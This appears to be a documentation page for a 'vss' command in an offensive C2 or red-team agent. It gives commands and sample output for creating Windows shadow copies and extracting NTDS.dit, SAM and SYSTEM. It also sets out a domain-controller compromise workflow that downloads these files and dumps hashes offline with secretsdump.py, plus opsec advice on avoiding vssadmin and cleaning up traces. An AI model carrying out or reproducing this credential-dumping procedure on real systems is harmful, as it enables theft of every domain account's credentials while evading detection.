+++
title = "vss"
chapter = false
weight = 111
hidden = false
+++

## Summary

Manage Volume Shadow Copies — list existing snapshots, create new ones, delete, and extract files from shadow copy device paths. Enables extraction of locked files like NTDS.dit or SAM without touching lsass.exe. Uses WMI `Win32_ShadowCopy` class for management and standard file I/O for extraction.

{{% notice info %}}Windows Only{{% /notice %}}

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | Yes | list | Action: `list`, `create`, `delete`, `extract` |
| volume | For create | C:\ | Volume to create shadow copy of |
| id | For delete/extract | - | Shadow copy ID (delete) or device path (extract) |
| source | For extract | - | Path within shadow copy to extract |
| dest | For extract | - | Local destination path |

## Usage

### List Shadow Copies
```
vss -action list
```
Shows all existing shadow copies with ID, device path, volume, creation date, and machine name.

### Create Shadow Copy
```
vss -action create
vss -action create -volume "C:\"
```
Creates a new shadow copy. Requires administrator privileges.

### Delete Shadow Copy
```
vss -action delete -id "{B36D884E-XXXX-XXXX-XXXX-XXXXXXXXXXXX}"
```
Deletes a specific shadow copy by ID (from list output). Requires administrator privileges.

### Extract File from Shadow Copy
```
vss -action extract -id "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1" -source "\Windows\NTDS\ntds.dit" -dest "C:\temp\ntds.dit"
vss -action extract -id "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1" -source "\Windows\System32\config\SAM" -dest "C:\temp\SAM"
vss -action extract -id "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1" -source "\Windows\System32\config\SYSTEM" -dest "C:\temp\SYSTEM"
```
Copies a file from within a shadow copy to a local path. The device path is shown in the `create` and `list` output.

## Example Output

### List
```
Volume Shadow Copies:

  [1] ID: {B36D884E-1234-5678-9ABC-DEF012345678}
      Device: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
      Volume: C:\
      Created: 20260223110000.000000-000
      Machine: WIN1123H2

Total: 1 shadow copies
```

### Create
```
Shadow copy created:
  Volume: C:\
  ID: {B36D884E-1234-5678-9ABC-DEF012345678}
  Device: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
  Return Value: 0

Extract files with:
  vss -action extract -id "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1" -source "\Windows\NTDS\ntds.dit" -dest "C:\temp\ntds.dit"
```

### Extract
```
Extracted from shadow copy:
  Source: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
  Dest: C:\temp\SAM
  Size: 65536 bytes
```

## Typical DC Compromise Workflow

1. Create shadow copy: `vss -action create`
2. Extract NTDS.dit: `vss -action extract -id "\\?\GLOBALROOT\..." -source "\Windows\NTDS\ntds.dit" -dest "C:\temp\ntds.dit"`
3. Extract SYSTEM hive: `vss -action extract -id "\\?\GLOBALROOT\..." -source "\Windows\System32\config\SYSTEM" -dest "C:\temp\SYSTEM"`
4. Download files: `download C:\temp\ntds.dit` and `download C:\temp\SYSTEM`
5. Offline extraction: `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`
6. Cleanup: Delete extracted files and shadow copy

## Operational Notes

- **Privileges**: Listing shadow copies works at any privilege level. Creating and deleting require administrator privileges.
- **WMI-based**: Uses `Win32_ShadowCopy` WMI class — no subprocess spawning (vssadmin.exe is never called)
- **File extraction**: Uses standard file I/O to read from the shadow copy device path. The shadow copy device path (`\\?\GLOBALROOT\Device\...`) is accessible as a regular file path.
- **NTDS.dit on DCs**: The Active Directory database is always locked by the NTDS service. Shadow copies provide a consistent, unlocked snapshot.
- **Opsec**: Shadow copy creation generates Event ID 8224 (VSS) in the Application log. Consider deleting the shadow copy after extraction.

## MITRE ATT&CK Mapping

- **T1003.003** — OS Credential Dumping: NTDS
